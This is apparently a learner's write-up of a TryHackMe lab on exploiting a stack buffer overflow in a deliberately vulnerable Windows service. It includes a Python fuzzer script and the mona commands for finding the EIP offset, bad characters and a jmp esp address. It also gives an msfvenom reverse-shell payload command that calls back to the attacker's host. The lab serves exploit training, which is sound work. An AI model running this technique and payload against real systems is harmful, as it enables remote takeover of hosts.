# Summary
In this room we will investigate a .exe file for buffer overflow exception. I was looking forward to this subject as it brings a whole new dimension to pentesting. We will be using Immunity Debugger with mona and will some scripts during the process.

Untill now I used ILSpy to reverse engineer C# applications but I've never had to work on a memory level like this before. Lot's to learn!

> Download Immunity Debugger from: https://www.immunityinc.com/.
> You simple drop mona.py into the PyCommands folder inside the Immunity Debugger application folder. Mona can be downloaded from https://github.com/corelan/mona.

> Note: Be sure to have both x86 and x64 VM's of Windows ready during OSCP as you can't debug x86 applications on a x64 architecture.


# Preparation
We start by connecting with xfreerdp and setting the network to home. After that we'll start Immunity Debugger and setup a working folder in mona:
```
!mona config -set workingfolder c:\mona\%p
```
Load the oscp.exe file in Immunity Debugger and start the program with ```F9```. We will now have the service running. 
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/OSCP%20Buffer%20Overflow/assets/1.png">

After a quick portscan we see that the application is running on port 1337. We connect with the application using netcat and discover that we can send commands using: ```OVERFLOW1 [value]```.

<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/OSCP%20Buffer%20Overflow/assets/2.png">

# Fuzzing
We will use a fuzzer (01-fuzzer.py) to see if we can break the application by sending an increasingly amount of bytes. This will be done by sending ```A``` a hundred times and repeat that process untill we get a notification that the application crashed.

```py
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.46.150"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024) 
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024) 
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

We crashed the application around 2000 bytes. We will use this later on to detect the memory offset of the EIP location as a starting point for our exploit.

<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/OSCP%20Buffer%20Overflow/assets/3.png">


# Crash replication & Controlling EIP
We will create a cyclic pattern of a length 400 greater than 2000 as those extra bytes will hold our payload (reverse shell) later on:
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
```
We paste the output as buffer in 02-offset.py and run the script.
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/OSCP%20Buffer%20Overflow/assets/4.png">

Run the following command to find the exact EIP offset
```
!mona findmsp -distance 2400
```
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/OSCP%20Buffer%20Overflow/assets/5.png">
The EIP offset is 1978.


# Finding Bad Characters
Before we can send our payload we need to make sure it doesn't hold any bad characters that will have a bad impact on the application. The zero byte (```\x00```) is one example of a bad char. This is a null-byte which will terminate the rest of the application code. We need to remove those from our payload.

> Method: At first we'll create a bin file of the current state of the program and crash it with bad chars. After that we will compare the memory enabling us to find the bad chars. We will repeat this process untill there are no more bad chars found.

So first we create the bin file with mona:
```
!mona bytearray -b "\x00"
```

Then we'll create a set of chars with Python (createbadchars.py):
```py
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

We add the characters to 03-badchar.py and change the EIP offset. 
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/OSCP%20Buffer%20Overflow/assets/6.png">

Run 03-badchar.py and note the ESP after the crash (it's in the CPU windows). Compare it with the bin:
```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/OSCP%20Buffer%20Overflow/assets/7.png">

Remove bad char from file and create new bin without bad chars:
```
!mona bytearray -b "\x00\x07"
```
Repeat these steps untill there are no more bad chars and the status is Unmodified.
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/OSCP%20Buffer%20Overflow/assets/8.png">


# Finding a Jump Point
This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window.
```
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
```
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/OSCP%20Buffer%20Overflow/assets/9.png">
We take the first address and reverse it as it's little-endian.

```
xaf/x11/x50/x62
```
This will be used as retn parameter in our exploit.

# Generate Payload
We generate the payload with msfvenom and add the bad chars as parameter.
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '\x00\x07\x2e\xa0' EXITFUNC=thread -f python -v payload
```
Add the output as payload in 04-exploit.py

# Prepend NOPS
As the payload is encoded we need some space in memory to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (```\x90```) bytes:
```
padding = "\x90" * 16
```

# Exploit
After setting all parameters in 04-exploit.py we're finally ready to run our exploit against the target:
```
python 04-exploit.py
```
With our listener ready this will results in a reverse shell and because the application runs as admin we now have admin rights on the host.
<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/OSCP%20Buffer%20Overflow/assets/10.png">

# Conclusion
Had a lot of fun doing this room. Learned a lot about memory allocation but still have the feeling I'm only scratching the surface.



